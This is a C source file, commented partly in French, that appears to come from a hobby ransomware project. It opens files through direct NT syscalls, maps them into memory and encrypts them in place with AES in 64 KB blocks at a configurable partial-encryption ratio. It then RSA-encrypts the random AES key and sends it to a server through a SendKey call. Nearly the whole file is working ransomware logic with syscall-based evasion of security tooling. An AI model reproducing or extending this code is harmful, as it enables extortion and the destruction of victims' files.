#include "core/encrypter.h"
#include "core/my_aes.h"
#include "utils/rng.h"
#include "core/rsa.h"
#include "core/api_client.h"
#include "core/aes_wrapper.h"

#define VIEW_SIZE (64 * 1024) // 64 KB
// #define SECTION_SIZE (0x100000) // 1MB

int loadFileInMemory(HANDLE *fileHandle, HANDLE *sectionHandle, PVOID *localViewAdress, PCWSTR filePath, uint64_t *sizeOfMappedView)
{
    *fileHandle = NULL;
    *sectionHandle = NULL;
    *localViewAdress = NULL;

    OBJECT_ATTRIBUTES oa;
    NTSTATUS status = 0;
    UNICODE_STRING fileName;
    IO_STATUS_BLOCK osb;

    RtlInitUnicodeString(&fileName, filePath);
    ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    // TODO : Se renseigner sur le caching de la mémoire
    // Avec notamment ces flags qui peuvent éviter le cache FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH
    status = SysNtCreateFile(
        fileHandle,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        &oa,
        &osb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    if (status != 0)
    {
        printf("Error opening file: 0x%X\n", status);
        return 1;
    }

    // Get the file size
    LARGE_INTEGER fileSize;
    GetFileSizeEx(*fileHandle, &fileSize);
    printf("File size: %lld bytes\n", fileSize.QuadPart);

    /*   SIZE_T originalSize = fileSize.QuadPart; // Save the original size for later use
      SIZE_T pageSize = 0;
      SYSTEM_INFO sysInfo;
      GetSystemInfo(&sysInfo);
      pageSize = sysInfo.dwPageSize;

      SIZE_T alignedSize = (originalSize + pageSize - 1) & ~(pageSize - 1);
      LARGE_INTEGER sectionSize.QuadPart = alignedSize;
      */

    // Create a section for the file
    // The section is a memory-mapped file
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = fileSize.QuadPart;

    status = SysNtCreateSection(
        sectionHandle,
        SECTION_MAP_READ | SECTION_MAP_WRITE,
        NULL,
        (PLARGE_INTEGER)&sectionSize,
        PAGE_READWRITE,
        SEC_COMMIT,
        *fileHandle);

    if (NT_SUCCESS(status))
    {
        printf("Section created successfully\n");
    }
    else
    {
        printf("Error creating the section: 0x%X\n", status);
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }

    ULONG zeroBits = 0; // Permet de forcer le système a mapper la vue dans une adresse basse de la mémoire virtuelle /!\ sur ma mahcine, au dessus de 11 ça ne fonctionne plus
    PVOID baseAddress = NULL;

    ULONG viewSize = 0; // 0 => 4 Ko (4096 bytes) = 1 page de mémoire
    SIZE_T commitSize = (SIZE_T)fileSize.QuadPart;
    *sizeOfMappedView = (uint64_t)fileSize.QuadPart; // Size of the mapped view
    if (fileSize.QuadPart > VIEW_SIZE)
    {
        commitSize = 0;
        viewSize = VIEW_SIZE;
        *sizeOfMappedView = VIEW_SIZE;
    }

    status = SysNtMapViewOfSection(
        *sectionHandle,
        GetCurrentProcess(),
        &baseAddress,
        zeroBits,
        commitSize,
        NULL, // NULL for the offset (it should be a multiple of the page size : 4096 bytes)
        &viewSize,
        ViewShare,
        0,
        PAGE_READWRITE);

    if (status != 0)
    {
        printf("Error mapping section: 0x%X\n", status);
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }

    *localViewAdress = baseAddress;

    if (*localViewAdress == NULL)
    {
        printf("Error local address section is NULL : %02X\n", status);
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }

    // Check if the mapping was successful
    if (NT_SUCCESS(status))
    {
        printf("Section mapped successfully at address: %p\n", *localViewAdress);
    }
    else
    {
        printf("Error mapping section: 0x%X\n", status);
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }

    return 0;
}

int moveLocalViewAddress(HANDLE *fileHandle, HANDLE *sectionHandle, PVOID *localViewAdress, uint64_t *sizeOfMappedView, uint64_t *offset)
{
    int info = 1;
    if (*localViewAdress == NULL)
    {
        printf("Error: local address is NULL\n");
        return 1;
    }

    NTSTATUS status = 0;
    ULONG zeroBits = 0; // Permet de forcer le système a mapper la vue dans une adresse basse de la mémoire virtuelle /!\ sur ma mahcine, au dessus de 11 ça ne fonctionne plus
    PVOID baseAddress = NULL;
    LARGE_INTEGER fileSize;
    GetFileSizeEx(*fileHandle, &fileSize);
    SIZE_T commitSize = 0;
    ULONG viewSize = VIEW_SIZE;

    *offset += *sizeOfMappedView; // Increment the offset by the size of the view
    printf("Offset: %llu\n", *offset);

    if (*offset + viewSize > commitSize)
    {
        viewSize = 0;
        commitSize = (SIZE_T)fileSize.QuadPart;
        *sizeOfMappedView = (uint64_t)fileSize.QuadPart - *offset; // Size of the mapped view
        info = 2;                                                  // Si on retourne 2 => on est arrivé à la fin du fichier.
    }

    status = SysNtMapViewOfSection(
        *sectionHandle,
        GetCurrentProcess(),
        &baseAddress,
        zeroBits,
        commitSize,
        (PLARGE_INTEGER)offset, // offset
        &viewSize,
        ViewShare,
        0,
        PAGE_READWRITE);

    if (!NT_SUCCESS(status))
    {
        printf("Error mapping section: 0x%X\n", status);
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }

    *localViewAdress = baseAddress;

    return info;
}

int key_handler(state_t key)
{

    // Send the key to the server
    char buff[257] = {'X'}; // 256 bytes + 1 for the null terminator

    uint8_t key_elongate[16] = {0}; // 16 bytes
    // Convert the key to a char array of size 16 bytes
    for (int i = 0; i < 16; i++)
    {
        // Convert to char
        key_elongate[i] = key[i / 4][i % 4];
    }

    // Encrypt the message using RSA
    rsa(key_elongate, buff);
    int i = 0;
    printf("Encrypted Key:\n'");
    while (buff[i] != 0)
    {
        printf("%c", buff[i]);
        i += 1;
    }
    printf("'\n");
    printf("Encrypted Key length: %d\n", i);

    // Send the key to the server (16 bytes)
    if (SendKey(buff) == 0)
    {
        return 0;
    }
    else
    {
        printf("Send failed\n");
        return 1;
    }
}


/**
 * @brief Chiffre un fichier en utilisant AES.
 *
 * Cette fonction prends un fichier et chiffre ce fichier par bloc de 64KB. Elle utilise AES
 * et sa densité dépend de encryptRatio qui est le nombre de blocs entre deux blocs chiffrés.
 * Le premier bloc chiffré est toujours le premier bloc de 64KB du fichier. 
 * \n 
 * Exemple : Si encryptRatio = 0, alors on chiffre tout le fichier. \n
 *           Si encryptRatio = 1, alors on chiffre un bloc sur deux. \n
 *           Si encryptRatio = 9, alors on chiffre un bloc sur dix. \n
 * 
 * @warning Si le fichier est inférieur à 64KB, encryptRatio doit être égal à 0. 
 * 
 * @param filePath Le chemin du fichier à chiffrer.
 * @param encryptRatio Le ratio de chiffrement (nombre de blocs entre deux blocs chiffrés).
 * @return 0 si le chiffrement a réussi, 1 sinon (erreur print dans le stdout).
 */
int encrypter(PCWSTR filePath, int encryptionRatio)
{
    HANDLE fileHandle = NULL;
    HANDLE sectionHandle = NULL;
    PVOID localViewAdress = NULL;

    uint64_t sizeOfMappedView = 0; // size of the mapped view
    uint64_t offset = 0;           // offset for the next view

    //Check if file exists
    DWORD fileAttributes = GetFileAttributesW(filePath);
    if (fileAttributes == INVALID_FILE_ATTRIBUTES)
    {
        printf("File not found: %ls\n", filePath);
        return 1;
    }
    // Check if the file is a directory
    if (fileAttributes & FILE_ATTRIBUTE_DIRECTORY)
    {
        printf("The specified path is a directory: %ls\n", filePath);
        return 1;
    }

    if (loadFileInMemory(&fileHandle, &sectionHandle, &localViewAdress, filePath, &sizeOfMappedView) != 0)
    {
        printf("erreur dans loadFileInMemry \n");
        return 1;
    }

    generateRandomSeed(); // Initialize the random seed
    // Generate a random key of 128 bits (16 bytes)
    state_t key;
    generateRandomKey(key);
    state_t keys[10] = {{{0}}}; // Initialize all keys to zero (the base_key is added in the function)

    // Generate the keys (can't be more than 10 keys because of the Rcon table)
    GenerateTenKeys(key, keys);

    uint32_t *vue = (uint32_t *)localViewAdress;
    if (vue == NULL)
    {
        printf("erreur : vue est nulle");
        return 1;
    }

    do
    {
        // répéter à plusieurs endroits dans le fichier
        printf("size ofMappedView: %llu\n", sizeOfMappedView);
        DispatchEcryption(keys, vue, sizeOfMappedView);
        // increase the offset if needed
        offset += sizeOfMappedView * encryptionRatio; // Increment the offset by the size of the view
    } while (moveLocalViewAddress(&fileHandle, &sectionHandle, &localViewAdress, &sizeOfMappedView, &offset) == 0);

   /*  state_t state = {
        {0x23, 0x45, 0x67, 0x89},
        {0xAB, 0xCD, 0xEF, 0x01},
        {0x09, 0x54, 0x67, 0x89},
        {0xCB, 0xA3, 0xEF, 0x10}};

    aes(keys, state);

    printf("encrypter side:  \n ");
    printState(state);
 */
    // Chiffrer plusieurs fichiers

    // Envoyer la clé

    // Free the section handle
    //  This will unmap the section from the process's address space
    //  and close the handle to the section object
    // syscall : NtUnmapViewOfSection(GetCurrentProcess(), localViewAdress);
    UnmapViewOfFile(localViewAdress); // Unmap using the API (no need to call syscall directly)
    CloseHandle(sectionHandle);
    // Close the file handle
    CloseHandle(fileHandle);

    return 0;
}

int main()
{
    PCWSTR filePath = (PCWSTR)L"\\??\\C:\\Users\\l3gro\\Documents\\code\\C\\ransomware\\test\\monfichier.txt";

    encrypter(filePath, 0);
    return 0;
}